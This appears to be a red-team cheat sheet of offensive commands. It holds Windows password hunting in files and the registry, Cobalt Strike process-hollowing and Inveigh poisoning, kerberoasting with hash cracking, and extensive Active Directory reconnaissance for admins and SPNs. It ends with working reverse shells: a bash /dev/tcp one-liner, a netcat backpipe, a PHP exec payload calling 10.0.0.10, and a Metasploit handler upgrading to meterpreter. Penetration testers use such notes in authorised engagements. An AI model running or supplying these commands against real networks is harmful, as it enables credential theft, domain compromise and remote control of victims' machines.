test "$(ps -ocommand= -p $PPID | awk '{print $1}')" == 'script' || (script -f ~/data/terminal_session_output/$(date +%Y%m%d%H%M%S)_shell.log)

Passwords:
findstr /si password *.txt
findstr /si password *.xml
dir /s *pass* == *cred* == *vnc* == *.config*
findstr /spin "password" *.*
reg query HKLM /f password /t REG_SZ /s
reg query HKCU /f password /t REG_SZ /s


Powershell:
change your child process for powerpicks and assembly executions (process-hollowing)
====================================================================================
spawnto C:\Program Files\internet explorer\iexplore.exe
spawnto x86 C:\Program Files (x86)\Internet Explorer\iexplore.exe

import a powershell script into memory 
======================================
powershell-import Z:\OneDrive\Documents\Hax\cobaltstrike\powershell\Inveigh\inveigh.ps1

run that powershell in an opsec friendly format (hollowed out process defined in spawnto)
=========================================================================================
powerpick invoke-inveigh -ConsoleOutput Y -mdns y -nbns y

crack a netntlmv2 hash collected through inveigh
================================================
.\hashcat64.exe -m 5600 path\to\netntlmv2.txt path\to\dict.txt

kerberoast
==========
execute-assembly Z:\OneDrive\Documents\Hax\cobaltstrike\assemblies\SharpRoast.exe all

to crack kerberoast 
===================
.\hashcat64.exe -m 13100 path\to\kerberoast_tgs.txt path\to\dict.txt

ACTIVE DIRECTORY:
Locate Domain Controllers
=========================
Locate DCs in the current domain
--------------------------------
```dsquery server```

```get-netdomaincontroller```

```net group “domain controllers” /domain```

```net view \\<server> #(DCs will have SYSVOL and NETLOGON shares)```

```cmd.exe /c set (LOGONSERVER variable)```

Locate DCs in the specified domain
----------------------------------
```dsquery server -domain <something.int>```

```get-netdomaincontroller -domain <something.int>```

```nslookup <something.int> (internally, this will likely return DCs that are DNS servers)```

```
nslookup (pseudo-shell)
	set type=all
	_ldap._tcp.<something.int>
```

```nbtstat -a (look for 1C attribute)```

Locate DCs forest-wide
----------------------
```dsquery server -forest```

```get-netforestdomain```

Locate Computer Account Objects
===============================
Show computer accounts
----------------------
```dsquery computer```

```dsquery * -filter “(objectclass=computer)” -attr dnshostname,description,operatingsystem,operatingsystemversion -limit 0```

```get-netcomputer```

```get-netcomputer -fulldata | select-object dnshostname,description,operatingsystem,operatingsystemversion```

Show servers based on description
---------------------------------
```dsquery * -filter “&(objectclass=computer)(operatingsystem=*server*)” -attr dnshostname,description,operatingsystem,operatingsystemversion -limit 0```

Locate Users
============
Show all AD user accounts
-------------------------
```dsquery user -limit 0```

```get-netuser (this will display all accounts and their attributes)```

```get-netuser | select-object samaccountname```

```net user /domain```

Show all attributes of a certain account
----------------------------------------
```dsquery * -filter “&(objectclass=user)(samaccountname=<user>)” -attr *```

```get-net-user <user>```

Show all users with no password expiration
------------------------------------------
```dsquery * -filter “&(objectclass=user)(useraccountcontrol>=65535)” -attr samaccountname,name```

```get-netuser -filter "useraccountcontrol>=65535" | select-object samaccountname,name```

Show user accounts and their associated SPNs
--------------------------------------------
```dsquery.exe * -filter "(serviceprincipalname=*)" -attr samaccountname, serviceprincipalname```

```dsquery.exe * -filter "&(serviceprincipalname=*)(samaccounttype=805306368)" -attr samaccountname,serviceprincipalname```

```get-netuser -spn | select-object samaccountname,serviceprincipalname```

Locate Administrators
=====================
Show all administrators
-----------------------
```dsquery * -filter “&(objectclass=user)(admincount=1)” -attr samaccountname,name (formal, native AD admins)```

```dsquery * -filter “&(objectclass=group)(name=*admin*)” -attr member -limit 0 -l (informal, search all groups with “admin”)```

```dsquery group -name *admin*```

```get-netuser -admincount | select-object samaccountname,name```

```get-netgroup -fulldata -groupname "*admin*" | select-object member (may also return group members in groups)```

Show all administrators with no password expiration
---------------------------------------------------
```dsquery * -filter “&(objectclass=user)(useraccountcontrol>=65535)(admincount=1)” -attr samaccountname,name```

```get-netuser -filter "(useraccountcontrol>=65535)(admincount=1)" | select-object samaccountname,name```

Show domain admins
------------------
```dsquery * -filter “name=domain admins” -attr member -l```

```get-netgroup -fulldata -groupname "domain admins" | select-object member```

```net group “domain admins” /domain```

Show enterprise admins (must have root domain visibility)
---------------------------------------------------------
```dsquery * -filter “name=enterprise admins” -attr member -d <forest domain.int>```

```get-netgroup -fulldata -groupname "enterprise admins" | select-object member```

```net group “enterprise admins” /domain (must have access to a forest domain member)```

Show local administrators on DCs
--------------------------------
```dsquery * -filter “name=administrators” -attr member -l (will return group members in groups)```

```get-netgroup -fulldata -groupname "administrators" | select-object member```

```net localgroup administrators /domain```

Locate Organizational Units
===========================
Show all OUs
------------
```dsquery ou -limit 0```

```get-netou```

```get-netou -fulldata (return all attributes)```

Show all users under a specific OU
----------------------------------
```dsquery * “ou=something,dc=domain,dc=int” -filter objectclass=user```

```Show all child OUs under parent OU```

```dsquery * “ou=something,dc=domain,dc=int” -filter objectcategory=organizationalunit) -attr name```

Interrogating GPOs
==================
Show All GPO data
-----------------
```dsquery * -filter “(objectclass=grouppolicycontainer)” -attr *```

```get-netgpo```

```Map GPO names (UUID) to display names```

```dsquery * -filter “(objectclass=grouppolicycontainer)” -attr name,displayname```

```get-netgpo | select-object name,displayname```

List OUs and applied GPOs
-------------------------
```dsquery * -filter “(objectcategory=organizationalunit)” -attr distinguishedname, gplink```

```get-netou -fulldata | select-object distinguishedname, gplink```

Interrogating Trust Relationships (3 means 2-way trust)
=======================================================
List Trust Relationships
------------------------
```dsquery * -filter “(objectclass=TrustedDomain)” -attr trustpartner,flatname,trustdirection```

```get-netdomaintrust```

Finding Legacy OS Versions
==========================
```dsquery * -filer (operatingSystemVersion=*5.*) -attr samaccountname operatingSystem```

Interrogating Sites and Subnets
===============================
List Sites and Subnets
----------------------
```dsquery subnet```

```get-netsubnet```

```dsquery site```

```get-netsite```

```dsquery * “cn=subnets,cn=sites,cn=configuration,dc=<something>,dc=<int>” -attr description,cn,siteobject```

List AD Partitions
------------------
```dsquery partition```


# bash raw TCP reverse socket from client
/bin/bash -c 'bash -i >& /dev/tcp/10.0.0.10/1234 0>&1'

# netcat BSD and sh limited reverse shell
mknod /tmp/backpipe p 
victim$ /bin/sh 0</tmp/backpipe | nc 10.0.0.10 1337 1>/tmp/backpipe

# PHP to bash reverse shell to IP
<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/10.0.0.10/1234 0>&1'"); ?>

# netcat bash bind shell to x64 meterpreter shell and configure ip/ports
## set up raw listener
msf > use exploit/multi/handler
## have metasploit first throw a regular reverse tcp shell
msf exploit(multi/handler) > set payload linux/x64/shell/reverse_tcp
msf exploit(multi/handler) > run
## kick off reverse shell, establish bash/sh session. Now upgrade it to meterpreter
msf > sessions -u 1
msf > sessions -i 2
